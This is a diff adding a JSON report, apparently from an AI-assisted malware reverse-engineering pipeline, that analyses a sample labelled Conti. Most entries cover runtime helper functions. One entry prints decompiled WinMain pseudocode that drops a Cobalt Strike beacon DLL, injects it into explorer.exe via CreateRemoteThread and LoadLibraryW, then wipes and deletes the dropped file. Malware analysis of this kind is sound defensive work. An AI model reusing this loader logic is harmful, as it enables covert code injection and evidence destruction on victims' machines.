@@ -1,0 +1,1241 @@
+{
+  "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
+  "sample_path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+  "model": "step-3.7-flash",
+  "generated_at": 1786156673.8397171,
+  "triage": {
+    "total_functions": 86,
+    "analyzed_in_pipeline": 40,
+    "signature_matches": 0,
+    "llm_candidates": 40
+  },
+  "deobfuscation": {
+    "error": "Traceback (most recent call last):\n  File \"/opt/revai/cff-deflatten/cff_deflatten.py\", line 222, in <module>\n    main()\n  File \"/opt/revai/cff-deflatten/cff_deflatten.py\", line 125, in main\n    import pyghidra\nModuleNotFoundError: No module named 'pyghidra'\n",
+    "rc": 1
+  },
+  "tier_count": 6,
+  "llm_calls": 18,
+  "estimated_prompt_tokens": 20434,
+  "function_results": [
+    {
+      "function_address": "5368718448",
+      "function_name": "_find_pe_section_by_name",
+      "confidence": 0.95,
+      "parameters": [
+        {
+          "name": "section_name",
+          "type": "char *"
+        }
+      ],
+      "return_type": "IMAGE_SECTION_HEADER *",
+      "notes": "This function iterates an array of PE section headers to locate an entry whose 8-byte Name field matches the input null-terminated string, returning a pointer to the matching IMAGE_SECTION_HEADER or NULL if no match is found. The initial length check for strings shorter than 9 bytes aligns with the 8-byte size limit of PE section name fields. The naming is consistent with adjacent PE section utility functions including _FindPESection and _FindPESectionExec.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3330,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-4586f5ea69c18d3837a6f67d27f9bb73.019fdf367dbc72948d5d8f9711a45714",
+        "system_fingerprint": null,
+        "prompt_tokens": 998,
+        "completion_tokens": 2416,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nIMAGE_SECTION_HEADER * _FindPESectionByName(char *param_1)\n\n{\n  size_t sVar1;\n  int tmp_iVar2;\n  undefined4 extraout_var;\n  IMAGE_SECTION_HEADER *__s1;\n  uint tmp_uVar3;\n  \n  sVar1 = strlen(param_1);\n  if (CONCAT44(extraout_var,sVar1) < 9) {\n    tmp_uVar3 = 0;\n    __s1 = &IMAGE_SECTION_HEADER_140000188;\n    do {\n      tmp_iVar2 = strncmp(__s1->Name,param_1,8);\n      if (tmp_iVar2 == 0) {\n        return __s1;\n      }\n      tmp_uVar3 = tmp_uVar3 + 1;\n      __s1 = __s1 + 1;\n    } while (tmp_uVar3 < 0x13);\n  }\n  return (IMAGE_SECTION_HEADER *)0x0;\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nIMAGE_SECTION_HEADER * _FindPESectionByName(char *param_1)\n\n{\n  size_t sVar1;\n  int iVar2;\n  undefined4 extraout_var;\n  IMAGE_SECTION_HEADER *__s1;\n  uint uVar3;\n  \n  sVar1 = strlen(param_1);\n  if (CONCAT44(extraout_var,sVar1) < 9) {\n    uVar3 = 0;\n    __s1 = &IMAGE_SECTION_HEADER_140000188;\n    do {\n      iVar2 = strncmp(__s1->Name,param_1,8);\n      if (iVar2 == 0) {\n        return __s1;\n      }\n      uVar3 = uVar3 + 1;\n      __s1 = __s1 + 1;\n    } while (uVar3 < 0x13);\n  }\n  return (IMAGE_SECTION_HEADER *)0x0;\n}\n\n"
+    },
+    {
+      "function_address": "5368714416",
+      "function_name": "find_process_id",
+      "confidence": 0.95,
+      "parameters": [
+        {
+          "name": "process_name",
+          "type": "const char *"
+        }
+      ],
+      "return_type": "DWORD",
+      "notes": "This function enumerates running processes using the Windows Toolhelp32 snapshot API, iterates through each process entry, and performs a case-insensitive comparison of the process executable name against the input string. It returns the process ID (PID) of the first matching process, or 0 if no match is found. The name is confirmed by the use of CreateToolhelp32Snapshot, Process32First, Process32Next, _stricmp, and CloseHandle, with a caller in WinMain indicating it is a utility helper for process lookup.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3611,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-9d7d95fc7937cae5b9af74d216448ca7.019fdf367e0d7abcb630831cc1c2b7db",
+        "system_fingerprint": null,
+        "prompt_tokens": 1085,
+        "completion_tokens": 2834,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nundefined4 FindProcessId(undefined8 param_1)\n\n{\n  int tmp_iVar1;\n  longlong tmp_lVar2;\n  undefined4 tmp_uVar3;\n  undefined4 local_148 [2];\n  undefined4 local_140;\n  undefined1 local_11c [260];\n  \n  tmp_uVar3 = 0;\n  tmp_lVar2 = CreateToolhelp32Snapshot(2);\n  if (tmp_lVar2 != -1) {\n    memset(local_148,0,0x130);\n    local_148[0] = 0x130;\n    tmp_iVar1 = Process32First(tmp_lVar2,local_148);\n    while (tmp_iVar1 != 0) {\n      tmp_iVar1 = _stricmp(local_11c,param_1);\n      tmp_uVar3 = local_140;\n      if (tmp_iVar1 == 0) goto LAB_14000153a;\n      tmp_iVar1 = Process32Next(tmp_lVar2,local_148);\n    }\n    tmp_uVar3 = 0;\nLAB_14000153a:\n    CloseHandle(tmp_lVar2);\n  }\n  return tmp_uVar3;\n}\n",
+      "raw_pseudocode": "\nundefined4 FindProcessId(undefined8 param_1)\n\n{\n  int iVar1;\n  longlong lVar2;\n  undefined4 uVar3;\n  undefined4 local_148 [2];\n  undefined4 local_140;\n  undefined1 local_11c [260];\n  \n  uVar3 = 0;\n  lVar2 = CreateToolhelp32Snapshot(2);\n  if (lVar2 != -1) {\n    memset(local_148,0,0x130);\n    local_148[0] = 0x130;\n    iVar1 = Process32First(lVar2,local_148);\n    while (iVar1 != 0) {\n      iVar1 = _stricmp(local_11c,param_1);\n      uVar3 = local_140;\n      if (iVar1 == 0) goto LAB_14000153a;\n      iVar1 = Process32Next(lVar2,local_148);\n    }\n    uVar3 = 0;\nLAB_14000153a:\n    CloseHandle(lVar2);\n  }\n  return uVar3;\n}\n\n"
+    },
+    {
+      "function_address": "5368717712",
+      "function_name": "___w64_mingwthr_add_key_dtor",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "key",
+          "type": "uint32_t"
+        },
+        {
+          "name": "dtor",
+          "type": "void*"
+        }
+      ],
+      "return_type": "int",
+      "notes": "This function registers a thread key destructor with the MinGW 64-bit thread runtime. It allocates a 0x18-byte list node, stores the input 32-bit key and 64-bit destructor pointer, then prepends the node to the global key_dtor_list while holding the __mingwthr_cs critical section to ensure thread safety. It returns 0 on successful registration, or -1 if the thread runtime is uninitialized or memory allocation fails, which aligns with the neighboring ___w64_mingwthr_remove_key_dtor and __mingwthr_run_key_dtors functions that manage the same destructor list.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3238,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-c419d5813c58df57b4d28e74eeec04b6.019fdf367e0b7279abd806d3c2269c81",
+        "system_fingerprint": null,
+        "prompt_tokens": 984,
+        "completion_tokens": 4257,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nundefined4 ___w64_mingwthr_add_key_dtor(undefined4 param_1,undefined8 param_2)\n\n{\n  undefined4 tmp_uVar1;\n  undefined4 *puVar2;\n  \n  tmp_uVar1 = 0;\n  if (__mingwthr_cs_init != 0) {\n    puVar2 = calloc(1,0x18);\n    if (puVar2 != (undefined4 *)0x0) {\n      *puVar2 = param_1;\n      *(undefined8 *)(puVar2 + 2) = param_2;\n      EnterCriticalSection(&__mingwthr_cs);\n      *(undefined4 **)(puVar2 + 4) = key_dtor_list;\n      key_dtor_list = puVar2;\n      LeaveCriticalSection(&__mingwthr_cs);\n      return 0;\n    }\n    tmp_uVar1 = -1;\n  }\n  return tmp_uVar1;\n}\n",
+      "raw_pseudocode": "\nundefined4 ___w64_mingwthr_add_key_dtor(undefined4 param_1,undefined8 param_2)\n\n{\n  undefined4 uVar1;\n  undefined4 *puVar2;\n  \n  uVar1 = 0;\n  if (__mingwthr_cs_init != 0) {\n    puVar2 = calloc(1,0x18);\n    if (puVar2 != (undefined4 *)0x0) {\n      *puVar2 = param_1;\n      *(undefined8 *)(puVar2 + 2) = param_2;\n      EnterCriticalSection(&__mingwthr_cs);\n      *(undefined4 **)(puVar2 + 4) = key_dtor_list;\n      key_dtor_list = puVar2;\n      LeaveCriticalSection(&__mingwthr_cs);\n      return 0;\n    }\n    uVar1 = 0xffffffff;\n  }\n  return uVar1;\n}\n\n"
+    },
+    {
+      "function_address": "5368718944",
+      "function_name": "_is_nonwritable_in_current_image",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "address",
+          "type": "void*"
+        }
+      ],
+      "return_type": "unsigned int",
+      "notes": "This function checks if a given virtual address lies within a non-writable section of the current PE image. It iterates through the image's IMAGE_SECTION_HEADER structures to locate the section containing the input address (adjusted by the image base 0x140000000), then returns 1 if the section lacks the IMAGE_SCN_MEM_WRITE characteristic flag, 0 otherwise. The behavior aligns with the function's original name and neighboring PE section utility functions like _FindPESectionExec and __mingw_GetSectionForAddress.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3282,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-0c6c49fd91da3456fc7a72979a045e73.019fdf36cf8272858f5963aa6fd2fd90",
+        "system_fingerprint": null,
+        "prompt_tokens": 976,
+        "completion_tokens": 5141,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x00014000267d) */\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nuint _IsNonwritableInCurrentImage(longlong param_1)\n\n{\n  IMAGE_SECTION_HEADER *tmp_pIVar1;\n  \n  tmp_pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((param_1 - 0x140000000U < (ulonglong)(uint)tmp_pIVar1->VirtualAddress ||\n         ((ulonglong)(tmp_pIVar1->VirtualAddress + (tmp_pIVar1->Misc).PhysicalAddress) <=\n          param_1 - 0x140000000U))) {\n    tmp_pIVar1 = tmp_pIVar1 + 1;\n    if (tmp_pIVar1 == (IMAGE_SECTION_HEADER *)&data_0x140000480) {\n      return 0;\n    }\n  }\n  return ~tmp_pIVar1->Characteristics >> 0x1f;\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x00014000267d) */\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nuint _IsNonwritableInCurrentImage(longlong param_1)\n\n{\n  IMAGE_SECTION_HEADER *pIVar1;\n  \n  pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((param_1 - 0x140000000U < (ulonglong)(uint)pIVar1->VirtualAddress ||\n         ((ulonglong)(pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress) <=\n          param_1 - 0x140000000U))) {\n    pIVar1 = pIVar1 + 1;\n    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_140000480) {\n      return 0;\n    }\n  }\n  return ~pIVar1->Characteristics >> 0x1f;\n}\n\n"
+    },
+    {
+      "function_address": "5368719088",
+      "function_name": "enum_import_library_names",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "import_index",
+          "type": "int"
+        }
+      ],
+      "return_type": "char*",
+      "notes": "This function enumerates PE import library names by zero-based index. It first locates the PE section containing the import directory at RVA 0x75000, then iterates through the 20-byte IMAGE_IMPORT_DESCRIPTOR array at that RVA, skipping entries until the target index is reached, and returns the name of the corresponding import library as a null-terminated string, or NULL if the index is out of range or no import section exists. The decompilation appears to have a field offset and base address mislabel, but the function's structure matches standard PE import enumeration logic, and neighboring functions are PE header utilities consistent with MinGW runtime code.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3335,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-afb56c75fdcc100c6cd2c60459a8371a.019fdf367dc276b7acff500e2d257269",
+        "system_fingerprint": null,
+        "prompt_tokens": 1023,
+        "completion_tokens": 7182,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nchar * __mingw_enum_import_library_names(int param_1)\n\n{\n  IMAGE_SECTION_HEADER *tmp_pIVar1;\n  dword *pdVar2;\n  \n  tmp_pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((0x75000 < (uint)tmp_pIVar1->VirtualAddress ||\n         (tmp_pIVar1->VirtualAddress + (tmp_pIVar1->Misc).PhysicalAddress < 0x75001))) {\n    tmp_pIVar1 = tmp_pIVar1 + 1;\n    if (tmp_pIVar1 == (IMAGE_SECTION_HEADER *)&data_0x140000480) {\n      return (char *)0x0;\n    }\n  }\n  for (pdVar2 = &DWORD_140075000; (pdVar2[1] != 0 || (pdVar2[3] != 0)); pdVar2 = pdVar2 + 5) {\n    if (param_1 < 1) {\n      return IMAGE_DOS_HEADER_140000000.e_magic + pdVar2[3];\n    }\n    param_1 = param_1 + -1;\n  }\n  return (char *)0x0;\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Enum \"SectionFlags\": Some values do not have unique names */\n\nchar * __mingw_enum_import_library_names(int param_1)\n\n{\n  IMAGE_SECTION_HEADER *pIVar1;\n  dword *pdVar2;\n  \n  pIVar1 = &IMAGE_SECTION_HEADER_140000188;\n  while ((0x75000 < (uint)pIVar1->VirtualAddress ||\n         (pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress < 0x75001))) {\n    pIVar1 = pIVar1 + 1;\n    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_140000480) {\n      return (char *)0x0;\n    }\n  }\n  for (pdVar2 = &DWORD_140075000; (pdVar2[1] != 0 || (pdVar2[3] != 0)); pdVar2 = pdVar2 + 5) {\n    if (param_1 < 1) {\n      return IMAGE_DOS_HEADER_140000000.e_magic + pdVar2[3];\n    }\n    param_1 = param_1 + -1;\n  }\n  return (char *)0x0;\n}\n\n"
+    },
+    {
+      "function_address": "5368715760",
+      "function_name": "_matherr",
+      "confidence": 0.95,
+      "parameters": [
+        {
+          "name": "exc",
+          "type": "struct exception *"
+        }
+      ],
+      "return_type": "int",
+      "notes": "This is the C runtime _matherr function that handles math library exceptions. It maps the exception type to a corresponding human-readable error string, then logs the error details (failing math function name, input arguments, return value) to stderr via fprintf. The naming is confirmed by the '_matherr()' prefix in the format string and the standard math exception type mappings (DOMAIN, OVERFLOW, UNDERFLOW, etc.) present in the switch case.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3813,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-cece1ead5309c635b4054526eb5a436d.019fdf37ade270d9808dbba6aa516b89",
+        "system_fingerprint": null,
+        "prompt_tokens": 1166,
+        "completion_tokens": 1448,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nint _text(exception *__exc)\n\n{\n  double tmp_dVar1;\n  double tmp_dVar2;\n  double tmp_dVar3;\n  char *pcVar4;\n  FILE *__stream;\n  char *pcVar5;\n  \n  switch(__exc->type) {\n  default:\n    pcVar5 = \"Unknown error\";\n    break;\n  case 1:\n    pcVar5 = \"Argument domain error (DOMAIN)\";\n    break;\n  case 2:\n    pcVar5 = \"Argument singularity (SIGN)\";\n    break;\n  case 3:\n    pcVar5 = \"Overflow range error (OVERFLOW)\";\n    break;\n  case 4:\n    pcVar5 = \"The result is too small to be represented (UNDERFLOW)\";\n    break;\n  case 5:\n    pcVar5 = \"Total loss of significance (TLOSS)\";\n    break;\n  case 6:\n    pcVar5 = \"Partial loss of significance (PLOSS)\";\n  }\n  tmp_dVar1 = __exc->retval;\n  tmp_dVar2 = __exc->arg2;\n  tmp_dVar3 = __exc->arg1;\n  pcVar4 = __exc->name;\n  __stream = (FILE *)__acrt_iob_func(2);\n  fprintf(__stream,\"_matherr(): %s in %s(%g, %g)  (retval=%g)\\n\",pcVar5,pcVar4,tmp_dVar3,tmp_dVar2,tmp_dVar1);\n  return 0;\n}\n",
+      "raw_pseudocode": "\nint _text(exception *__exc)\n\n{\n  double dVar1;\n  double dVar2;\n  double dVar3;\n  char *pcVar4;\n  FILE *__stream;\n  char *pcVar5;\n  \n  switch(__exc->type) {\n  default:\n    pcVar5 = \"Unknown error\";\n    break;\n  case 1:\n    pcVar5 = \"Argument domain error (DOMAIN)\";\n    break;\n  case 2:\n    pcVar5 = \"Argument singularity (SIGN)\";\n    break;\n  case 3:\n    pcVar5 = \"Overflow range error (OVERFLOW)\";\n    break;\n  case 4:\n    pcVar5 = \"The result is too small to be represented (UNDERFLOW)\";\n    break;\n  case 5:\n    pcVar5 = \"Total loss of significance (TLOSS)\";\n    break;\n  case 6:\n    pcVar5 = \"Partial loss of significance (PLOSS)\";\n  }\n  dVar1 = __exc->retval;\n  dVar2 = __exc->arg2;\n  dVar3 = __exc->arg1;\n  pcVar4 = __exc->name;\n  __stream = (FILE *)__acrt_iob_func(2);\n  fprintf(__stream,\"_matherr(): %s in %s(%g, %g)  (retval=%g)\\n\",pcVar5,pcVar4,dVar3,dVar2,dVar1);\n  return 0;\n}\n\n"
+    },
+    {
+      "function_address": "5368718032",
+      "function_name": "__mingw_tls_callback",
+      "confidence": 0.95,
+      "parameters": [
+        {
+          "name": "dll_instance",
+          "type": "HMODULE"
+        },
+        {
+          "name": "tls_reason",
+          "type": "uint32_t"
+        }
+      ],
+      "return_type": "int",
+      "notes": "This is a MinGW runtime TLS callback that manages the C++ thread-local storage key destructor infrastructure. It initializes a critical section on thread attach, runs pending key destructors and frees associated resources on process/thread detach, and invokes the .text entry point when the TLS reason is 2. Evidence includes callers being TLS callback entry points (tls_callback_0, tls_callback_1) and callees for critical section management and key destructor execution (InitializeCriticalSection, DeleteCriticalSection, __mingwthr_run_key_dtors.part.0, free).",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3883,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-8b22f1ddeaf336782eb09f9f8a6ff25e.019fdf37ade07511a3ee70fdf16cb6dc",
+        "system_fingerprint": null,
+        "prompt_tokens": 1206,
+        "completion_tokens": 3512,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nundefined8 __mingw_TLScallback(undefined8 param_1,uint param_2)\n\n{\n  void *pvVar1;\n  void *__ptr;\n  \n  if (param_2 == 2) {\n    _text();\n    return 1;\n  }\n  if (param_2 < 3) {\n    if (param_2 == 0) {\n      if (__mingwthr_cs_init != 0) {\n        __mingwthr_run_key_dtors_part_0();\n      }\n      if (__mingwthr_cs_init == 1) {\n        __mingwthr_cs_init = 1;\n        __ptr = key_dtor_list;\n        while (__ptr != (void *)0x0) {\n          pvVar1 = *(void **)((longlong)__ptr + 0x10);\n          free(__ptr);\n          __ptr = pvVar1;\n        }\n        key_dtor_list = (void *)0x0;\n        __mingwthr_cs_init = 0;\n        DeleteCriticalSection(&__mingwthr_cs);\n      }\n    }\n    else {\n      if (__mingwthr_cs_init == 0) {\n        InitializeCriticalSection(&__mingwthr_cs);\n      }\n      __mingwthr_cs_init = 1;\n    }\n  }\n  else if ((param_2 == 3) && (__mingwthr_cs_init != 0)) {\n    __mingwthr_run_key_dtors_part_0();\n  }\n  return 1;\n}\n",
+      "raw_pseudocode": "\nundefined8 __mingw_TLScallback(undefined8 param_1,uint param_2)\n\n{\n  void *pvVar1;\n  void *__ptr;\n  \n  if (param_2 == 2) {\n    _text();\n    return 1;\n  }\n  if (param_2 < 3) {\n    if (param_2 == 0) {\n      if (__mingwthr_cs_init != 0) {\n        __mingwthr_run_key_dtors_part_0();\n      }\n      if (__mingwthr_cs_init == 1) {\n        __mingwthr_cs_init = 1;\n        __ptr = key_dtor_list;\n        while (__ptr != (void *)0x0) {\n          pvVar1 = *(void **)((longlong)__ptr + 0x10);\n          free(__ptr);\n          __ptr = pvVar1;\n        }\n        key_dtor_list = (void *)0x0;\n        __mingwthr_cs_init = 0;\n        DeleteCriticalSection(&__mingwthr_cs);\n      }\n    }\n    else {\n      if (__mingwthr_cs_init == 0) {\n        InitializeCriticalSection(&__mingwthr_cs);\n      }\n      __mingwthr_cs_init = 1;\n    }\n  }\n  else if ((param_2 == 3) && (__mingwthr_cs_init != 0)) {\n    __mingwthr_run_key_dtors_part_0();\n  }\n  return 1;\n}\n\n"
+    },
+    {
+      "function_address": "5368714576",
+      "function_name": "cobalt_beacon_inject_and_cleanup",
+      "confidence": 0.9,
+      "parameters": [],
+      "return_type": "int",
+      "notes": "This function deploys an embedded Cobalt Strike beacon DLL (referenced as beacon_dll) by writing it to a temporary or current-directory DLL path, injecting it into the running explorer.exe process via remote thread execution of LoadLibraryW, then overwrites and deletes the on-disk payload to remove forensic evidence. The name is derived from its core behavior of Cobalt Strike beacon injection and cleanup, supported by the beacon_dll data reference, explorer.exe string literal, and use of process injection APIs (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread).",
+      "behavior_tags": [
+        "process-injection",
+        "persistence",
+        "anti-analysis"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 5755,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-b314aa3c73a88519eef0a61bd85a98c2.019fdf37adef7d22a46ad53a9ce3c617",
+        "system_fingerprint": null,
+        "prompt_tokens": 1840,
+        "completion_tokens": 5271,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nundefined8 WinMain(void)\n\n{\n  int tmp_iVar1;\n  size_t sVar2;\n  undefined4 tmp_uVar3;\n  longlong tmp_lVar4;\n  undefined4 extraout_var;\n  longlong tmp_lVar5;\n  undefined8 tmp_uVar6;\n  longlong tmp_lVar7;\n  uint tmp_uVar8;\n  undefined8 in_stack_fffffffffffffb78;\n  longlong tmp_lVar9;\n  undefined4 tmp_uVar10;\n  undefined1 local_44d;\n  undefined1 local_44c [4];\n  undefined1 local_448 [528];\n  wchar_t local_238 [268];\n  \n  tmp_uVar10 = (undefined4)((ulonglong)in_stack_fffffffffffffb78 >> 0x20);\n  tmp_iVar1 = GetTempPathW(0x104,local_448);\n  if (tmp_iVar1 != 0) {\n    tmp_iVar1 = GetTempFileNameW(local_448,&data_0x140071000,0,local_238);\n    if (tmp_iVar1 == 0) {\n      GetCurrentDirectoryW(0x104,local_448);\n      tmp_uVar3 = GetTickCount();\n      tmp_uVar6 = CONCAT44(tmp_uVar10,tmp_uVar3);\n      (*(code *)__imp__snwprintf)(local_238,0x104,L\"%s\\\\dl%lu.dll\",local_448,tmp_uVar6);\n      tmp_uVar10 = (undefined4)((ulonglong)tmp_uVar6 >> 0x20);\n    }\n    tmp_lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(tmp_uVar10,2),0x80,0);\n    if (tmp_lVar4 != -1) {\n      tmp_uVar10 = 0;\n      WriteFile(tmp_lVar4,&beacon_dll,data_0x140003000,local_44c,0);\n      CloseHandle(tmp_lVar4);\n      tmp_iVar1 = FindProcessId(\"explorer.exe\");\n      if (tmp_iVar1 != 0) {\n        tmp_lVar4 = OpenProcess(0x43a,0,tmp_iVar1);\n        if (tmp_lVar4 != 0) {\n          sVar2 = wcslen(local_238);\n          tmp_lVar9 = CONCAT44(extraout_var,sVar2) * 2 + 2;\n          tmp_uVar6 = CONCAT44(tmp_uVar10,4);\n          tmp_lVar5 = VirtualAllocEx(tmp_lVar4,0,tmp_lVar9,0x3000,tmp_uVar6);\n          tmp_uVar10 = (undefined4)((ulonglong)tmp_uVar6 >> 0x20);\n          if (tmp_lVar5 != 0) {\n            WriteProcessMemory(tmp_lVar4,tmp_lVar5,local_238,tmp_lVar9,0);\n            tmp_uVar6 = GetModuleHandleA(\"kernel32.dll\");\n            tmp_uVar6 = GetProcAddress(tmp_uVar6,\"LoadLibraryW\");\n            tmp_lVar9 = tmp_lVar5;\n            tmp_lVar7 = CreateRemoteThread(tmp_lVar4,0,0,tmp_uVar6,tmp_lVar5,0,0);\n            tmp_uVar10 = (undefined4)((ulonglong)tmp_lVar9 >> 0x20);\n            if (tmp_lVar7 != 0) {\n              WaitForSingleObject(tmp_lVar7,-1);\n              CloseHandle(tmp_lVar7);\n            }\n            VirtualFreeEx(tmp_lVar4,tmp_lVar5,0,0x8000);\n          }\n          CloseHandle(tmp_lVar4);\n          tmp_lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(tmp_uVar10,3),0,0);\n          if (tmp_lVar4 != -1) {\n            local_44d = 0;\n            if (data_0x140003000 != 0) {\n              tmp_uVar8 = 0;\n              do {\n                tmp_uVar8 = tmp_uVar8 + 1;\n                WriteFile(tmp_lVar4,&local_44d,1,local_44c,0);\n              } while (tmp_uVar8 < data_0x140003000);\n            }\n            CloseHandle(tmp_lVar4);\n          }\n          DeleteFileW(local_238);\n          return 0;\n        }\n      }\n      DeleteFileW(local_238);\n    }\n  }\n  return 1;\n}\n",
+      "raw_pseudocode": "\nundefined8 WinMain(void)\n\n{\n  int iVar1;\n  size_t sVar2;\n  undefined4 uVar3;\n  longlong lVar4;\n  undefined4 extraout_var;\n  longlong lVar5;\n  undefined8 uVar6;\n  longlong lVar7;\n  uint uVar8;\n  undefined8 in_stack_fffffffffffffb78;\n  longlong lVar9;\n  undefined4 uVar10;\n  undefined1 local_44d;\n  undefined1 local_44c [4];\n  undefined1 local_448 [528];\n  wchar_t local_238 [268];\n  \n  uVar10 = (undefined4)((ulonglong)in_stack_fffffffffffffb78 >> 0x20);\n  iVar1 = GetTempPathW(0x104,local_448);\n  if (iVar1 != 0) {\n    iVar1 = GetTempFileNameW(local_448,&DAT_140071000,0,local_238);\n    if (iVar1 == 0) {\n      GetCurrentDirectoryW(0x104,local_448);\n      uVar3 = GetTickCount();\n      uVar6 = CONCAT44(uVar10,uVar3);\n      (*(code *)__imp__snwprintf)(local_238,0x104,L\"%s\\\\dl%lu.dll\",local_448,uVar6);\n      uVar10 = (undefined4)((ulonglong)uVar6 >> 0x20);\n    }\n    lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(uVar10,2),0x80,0);\n    if (lVar4 != -1) {\n      uVar10 = 0;\n      WriteFile(lVar4,&beacon_dll,DAT_140003000,local_44c,0);\n      CloseHandle(lVar4);\n      iVar1 = FindProcessId(\"explorer.exe\");\n      if (iVar1 != 0) {\n        lVar4 = OpenProcess(0x43a,0,iVar1);\n        if (lVar4 != 0) {\n          sVar2 = wcslen(local_238);\n          lVar9 = CONCAT44(extraout_var,sVar2) * 2 + 2;\n          uVar6 = CONCAT44(uVar10,4);\n          lVar5 = VirtualAllocEx(lVar4,0,lVar9,0x3000,uVar6);\n          uVar10 = (undefined4)((ulonglong)uVar6 >> 0x20);\n          if (lVar5 != 0) {\n            WriteProcessMemory(lVar4,lVar5,local_238,lVar9,0);\n            uVar6 = GetModuleHandleA(\"kernel32.dll\");\n            uVar6 = GetProcAddress(uVar6,\"LoadLibraryW\");\n            lVar9 = lVar5;\n            lVar7 = CreateRemoteThread(lVar4,0,0,uVar6,lVar5,0,0);\n            uVar10 = (undefined4)((ulonglong)lVar9 >> 0x20);\n            if (lVar7 != 0) {\n              WaitForSingleObject(lVar7,0xffffffff);\n              CloseHandle(lVar7);\n            }\n            VirtualFreeEx(lVar4,lVar5,0,0x8000);\n          }\n          CloseHandle(lVar4);\n          lVar4 = CreateFileW(local_238,0x40000000,0,0,CONCAT44(uVar10,3),0,0);\n          if (lVar4 != -1) {\n            local_44d = 0;\n            if (DAT_140003000 != 0) {\n              uVar8 = 0;\n              do {\n                uVar8 = uVar8 + 1;\n                WriteFile(lVar4,&local_44d,1,local_44c,0);\n              } while (uVar8 < DAT_140003000);\n            }\n            CloseHandle(lVar4);\n          }\n          DeleteFileW(local_238);\n          return 0;\n        }\n      }\n      DeleteFileW(local_238);\n    }\n  }\n  return 1;\n}\n\n"
+    },
+    {
+      "function_address": "5368719616",
+      "function_name": "_amsg_exit",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "error_code",
+          "type": "int"
+        }
+      ],
+      "return_type": "void",
+      "notes": "This function matches the standard MSVCRT _amsg_exit routine: it writes the 'runtime error %d\\n' format string to stderr (obtained via __acrt_iob_func(2)) with the provided error code, then terminates the process via _exit. The code after the _exit call is unreachable decompilation artifacts, as _exit does not return. It is invoked by the C runtime startup function __tmainCRTStartup, consistent with its role as a fatal runtime error handler.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3616,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-9e9723e0e69ea3bbe6b55c4eb067228e.019fdf37e9b97539a0b58d0161736815",
+        "system_fingerprint": null,
+        "prompt_tokens": 1098,
+        "completion_tokens": 8136,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
